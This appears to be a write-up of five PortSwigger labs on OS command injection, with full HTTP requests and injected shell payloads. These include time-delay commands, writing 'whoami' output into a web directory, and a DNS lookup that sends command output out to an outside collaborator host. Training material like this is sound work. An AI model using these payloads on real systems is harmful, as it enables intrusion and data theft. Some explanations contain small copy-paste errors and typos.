
# Command Injection Labs

### LAB #1: OS command injection - a simple case

Lab URL: https://portswigger.net/web-security/os-command-injection/lab-simple

Objective: Execute the `whoami` command to determine the name of the current user.

This lab contains a shopping application that has different no of products for purchase. Each product has a `Check Stock` functionality in which we can see which products are in stock.

For checking the stock they are sending the POST request to the `/product/stock` endpoint with the following parameters.

```
productId=1&storeId=1
```

If we change the `productID` with `%26woami||` we can successfully execute the shell commands.

### LAB #2: Blind OS command injection with time delays

Lab URL: https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays

Objective: Exploit the blind OS command that causes a 10-second delay.

This lab contains a shopping application that has a different number of products for purchase. The site also has a `submit feedback` functionality on `/feedback/submit`. We can submit feedback using a POST request with the parameters `csrf`, `name`, `email`, `subject`, and `message`. This request looks like the following.

```
POST /feedback/submit HTTP/2
Host: 0a570077046bf0ec819c20e200ff00fc.web-security-academy.net
Cookie: session=vvR2TvdcvgzSfd9Gk9hSwbgJ06skpFgQ
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 124
Origin: https://0a570077046bf0ec819c20e200ff00fc.web-security-academy.net
Dnt: 1
Referer: https://0a570077046bf0ec819c20e200ff00fc.web-security-academy.net/feedback

csrf=TDzkG4ZyyhjE890Ojvukl4FNTgNQhHhE&name=temp&email=temp%40temp.com&subject=anything&message=hello
```

If we change the email parameter like the following we will see certain seconds of time delay in our response.

```
csrf=TDzkG4ZyyhjE890Ojvukl4FNTgNQhHhE&name=temp&email=temp%40temp.com||ping+-c+10+localhost||&subject=anything&message=hello
```

There we use `||` to break the shell command and then add a ping command to `localhost` that will send total request pings after that we separate the remaining command with the `||` character. They are using OS native email functionality to send an email that gets the `email`, and `subject` like this.

```
mail –s "anything" temp@temp.com
```

They add our user-supplied email without any validation into the shell command and with that, the above shell command becomes like this

```
mail -s "anything" temp@temp.com||ping -c 10 localhost||
```

### LAB #3: Blind OS command injection with output redirection

Lab URL: https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection

Objective: Execute the `whoami` command and retrieve its output.

This lab contains a shopping application that has a different number of products for purchase. The site also has a `submit feedback` functionality on `/feedback/submit`. We can submit feedback using a POST request with the parameters `csrf`, `name`, `email`, `subject`, and `message`. This request looks like the following.

```
POST /feedback/submit HTTP/2
Host: 0ab000790446117e80a412330022000c.web-security-academy.net
Cookie: session=0YWiP22CUfWGE4dcvQS2B7XyRJmCzj7x
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 98
Origin: https://0ab000790446117e80a412330022000c.web-security-academy.net
Dnt: 1
Referer: https://0ab000790446117e80a412330022000c.web-security-academy.net/feedback

csrf=cmzN16GjRkBRjSFUpK8pLBr9URq7ytvn&name=temp&email=temp%40temp.com&subject=temp&message=temp%0A
```

If we change the email parameter like the following we will see certain seconds of time delay in our response.

```
csrf=cmzN16GjRkBRjSFUpK8pLBr9URq7ytvn&name=temp&email=temp%40temp.com||sleep+10||&subject=temp&message=temp%0A
```

There we use `||` to break the shell command and then add a ping command to `localhost` that will send total request pings after that we separate the remaining command with the `||` character. They use OS native email functionality to send an email that gets the `email`, and `subject` like this.

```
mail –s "anything" temp@temp.com
```

They add our user-supplied email without any validation into the shell command and with that, the above shell command becomes like this

```
mail -s "anything" temp@temp.com||ping -c 10 localhost||
```

Confirming we have a blind command injection we can run any command and redirect its output to a file in a readable directory. After that, we can read that file by visiting that file URL in the browser. So the steps should look like the following.

```
POST /feedback/submit HTTP/2
Host: 0ab000790446117e80a412330022000c.web-security-academy.net
Cookie: session=0YWiP22CUfWGE4dcvQS2B7XyRJmCzj7x
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 137
Origin: https://0ab000790446117e80a412330022000c.web-security-academy.net
Dnt: 1
Referer: https://0ab000790446117e80a412330022000c.web-security-academy.net/feedback
Te: trailers

csrf=cmzN16GjRkBRjSFUpK8pLBr9URq7ytvn&name=temp&email=temp%40temp.com||whoami+>+/var/www/images/whoami.txt||&subject=temp&message=temp%0A
```

There we use the following command in the email parameter.

```
whoami > /var/www/images/whoami.txt
```

this executes the `whoami` command that is used to get the username of the currently logged-in user in the OS and then we use output redirector `>` that will redirect the output of the command to a file and writes it so we supplied `/var/www/images/whoami.txt` path. In which `whoami.txt` is the file created and contains the output of the `whoami` command.

As we know the site uses the following url to fetch images.

```
https://0ab000790446117e80a412330022000c.web-security-academy.net/image?filename=01.png
```

we can use that to get out the `whoami.txt` file like the following.

```
https://0ab000790446117e80a412330022000c.web-security-academy.net/image?filename=whoami.txt
```

### LAB #4: Blind OS command injection with out-of-band interaction

Lab URL: https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band

Objective: Exploit OS command injection to issue a DNS lookup to Burp Collaborator

This lab contains a shopping application that has a different number of products for purchase. The site also has a `submit feedback` functionality on `/feedback/submit`. We can submit feedback using a POST request with the parameters `csrf`, `name`, `email`, `subject`, and `message`. This request looks like the following.

```
POST /feedback/submit HTTP/2
Host: 0a6c00b3049c885780ab4e7900ee00db.web-security-academy.net
Cookie: session=X52KKnSbEHZFBZuXv0FDFb4yzmWsHAf1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Te: trailers
Connection: close

csrf=wV6E44vNhrydBtLgr6UVBB5bbQi0LPb5&name=temp&email=temp%40temp.com&subject=temp&message=temp
```

If we change the email parameter like the following

```
csrf=wV6E44vNhrydBtLgr6UVBB5bbQi0LPb5&name=temp&email=temp%40temp.com||sleep+10||&subject=temp&message=temp
```

we will not see any certain seconds of time delay in our response but if we supplied a burp collaborator domain like this we will see an out-of-band interaction.

```
csrf=wV6E44vNhrydBtLgr6UVBB5bbQi0LPb5&name=temp&email=temp%40temp.com||nslookup+gn7rxenzjteskktdr2zxjnkxjoped3.oastify.com||&subject=temp&message=temp
```

### LAB #5: Blind OS command injection with out-of-band data exfiltration

Lab URL: https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration

Objective: Exploit OS command injection to do an out-of-band interaction to exfiltrate the the output of `whoami` command.

This lab contains a shopping application that has a different number of products for purchase. The site also has a `submit feedback` functionality on `/feedback/submit`. We can submit feedback using a POST request with the parameters `csrf`, `name`, `email`, `subject`, and `message`. This request looks like the following.

```
POST /feedback/submit HTTP/2
Host: 0a6c00b3049c885780ab4e7900ee00db.web-security-academy.net
Cookie: session=X52KKnSbEHZFBZuXv0FDFb4yzmWsHAf1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Te: trailers
Connection: close

csrf=wV6E44vNhrydBtLgr6UVBB5bbQi0LPb5&name=temp&email=temp%40temp.com&subject=temp&message=temp
```

If we change the email parameter like the following

```
csrf=wV6E44vNhrydBtLgr6UVBB5bbQi0LPb5&name=temp&email=temp%40temp.com||sleep+10||&subject=temp&message=temp
```

we will not see any certain seconds of time delay in our response but if we supplied a burp collaborator domain like this we will see an out-of-band interaction.

```
csrf=wV6E44vNhrydBtLgr6UVBB5bbQi0LPb5&name=temp&email=temp%40temp.com||nslookup+gn7rxenzjteskktdr2zxjnkxjoped3.oastify.com||&subject=temp&message=temp
```

Knowing there is a command injection vulnerability we can exfiltrate data like the following.

```
csrf=wV6E44vNhrydBtLgr6UVBB5bbQi0LPb5&name=temp&email=temp%40temp.com||nslookup+`whoami`.gn7rxenzjteskktdr2zxjnkxjoped3.oastify.com||&subject=temp&message=temp
```

There we use backticks to run the inline shell command and append its output to our burp collaborator subdomain. So when this command run we will see the username of the currently logged-in user with the domain name like the following in our burp collaborator logs.

```
peter.gn7rxenzjteskktdr2zxjnkxjoped3.oastify.com
```